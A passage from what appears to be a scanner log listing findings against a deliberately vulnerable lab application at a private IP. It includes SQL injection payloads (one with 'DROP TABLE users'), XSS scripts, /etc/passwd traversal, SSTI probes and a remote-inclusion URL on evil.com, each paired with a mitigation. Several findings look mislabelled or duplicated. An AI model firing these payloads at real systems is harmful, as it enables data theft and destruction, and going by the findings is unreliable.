POST request to http://192.168.18.9:8000/api/lfivuln with JSON body: {'filename': '/etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'SQL Injection (SQLite3)', 'severity': 'High', 'description': 'The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.', 'reproduce': 'POST http://192.168.18.9:8000/api/sqlivuln with {"username": "\' UNION SELECT name, sql FROM sqlite_master WHERE type=\'table\' --", "password": "test"}', 'mitigation': 'Use parameterized queries or prepared statements and sanitize all user inputs.'}, {'type': 'Server-Side Template Injection (SSTI)', 'severity': 'High', 'description': 'The application is prone to Server-Side Template Injection attacks. SSTI occurs when user input is used directly in server-side templates, potentially leading to code execution on the server.', 'reproduce': 'GET http://192.168.18.9:8000/api/sstinovuln?mathexp={{7*7}}\nGET http://192.168.18.9:8000/api/sstinovuln?mathexp={# 7 * 7 #}', 'mitigation': 'Sanitize user input and avoid dynamic template evaluation'}, {'type': 'SQL Injection (SQLite3)', 'severity': 'High', 'description': 'The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\' UNION SELECT sqlite_version(), NULL --"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\' UNION SELECT name, sql FROM sqlite_master WHERE type=\'table\' --"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\' AND sqlite_version() --"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\'; DROP TABLE users; --"}', 'mitigation': 'Use parameterized queries or prepared statements and sanitize all user inputs.'}, {'type': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'description': 'The application is susceptible to Cross-Site Scripting attacks. These vulnerabilities occur when unvalidated user inputs are rendered directly in the HTML page, allowing malicious scripts to be executed in the context of the website.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "<script>alert(\'xss\')</script>"}\nPOST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "\'><img src=x onerror=alert(1)>"}', 'mitigation': 'Sanitize user input and implement Content Security Policy (CSP)'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '/etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': '../../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/sstivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/sstivuln with JSON body: {'mathexp': 'file:///etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Remote File Inclusion (RFI)', 'severity': 'High', 'description': 'The application is vulnerable to Remote File Inclusion attacks. RFI occurs when user-supplied input is used to include remote files from external servers, leading to potential code execution and unauthorized access.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "http://evil.com/malicious.php"}', 'mitigation': 'Disallow remote file inclusion and validate inputs'}, {'type': 'Server-Side Template Injection (SSTI)', 'severity': 'High', 'description': 'The application is prone to Server-Side Template Injection attacks. SSTI occurs when user input is used directly in server-side templates, potentially leading to code execution on the server.', 'reproduce': 'POST http://192.168.18.9:8000/api/sstivuln with {"mathexp": "{{7*7}}"}', 'mitigation': 'Sanitize user input and avoid dynamic template evaluation'}, {'type': 'SQL Injection (SQLite3)', 'severity': 'High', 'description': 'The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.', 'reproduce': 'POST http://192.168.18.9:8000/api/xssreflected with {"username": "\' UNION SELECT sqlite_version(), NULL --", "password": "test"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\' UNION SELECT name, sql FROM sqlite_master WHERE type=\'table\' --", "password": "test"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\' AND sqlite_version() --", "password": "test"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\'; DROP TABLE users; --", "password": "test"}', 'mitigation': 'Use parameterized queries or prepared statements and sanitize all user inputs.'}, {'type': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'description': 'The application is susceptible to Cross-Site Scripting attacks. These vulnerabilities occur when unvalidated user inputs are rendered directly in the HTML page, allowing malicious scripts to be executed in the context of the website.', 'reproduce': 'POST http://192.168.18.9:8000/api/xssreflected with {"username": "<script>alert(\'xss\')</script>"}\nPOST http://192.168.18.9:8000/api/xssreflected with {"username": "\'><img src=x onerror=alert(1)>"}', 'mitigation': 'Sanitize user input and implement Content Security Policy (CSP)'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '/etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': '../../../etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/xssreflected allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/xssreflected with JSON body: {'username': 'file:///etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}, {'type': 'Remote File Inclusion (RFI)', 'severity': 'High', 'description': 'The application is vulnerable to Remote File Inclusion attacks. RFI occurs when user-supplied input is used to include remote files from external servers, leading to potential code execution and unauthorized access.', 'reproduce': 'POST http://192.168.18.9:8000/api/xssreflected with {"username": "http://evil.com/malicious.php"}', 'mitigation': 'Disallow remote file inclusion and validate inputs'}]
+2025-03-16 17:51:36,534 - INFO - Starting HTML report generation
+2025-03-16 17:51:36,534 - INFO - HTML report generated successfully
+2025-03-16 17:51:36,534 - INFO - Scan completed successfully
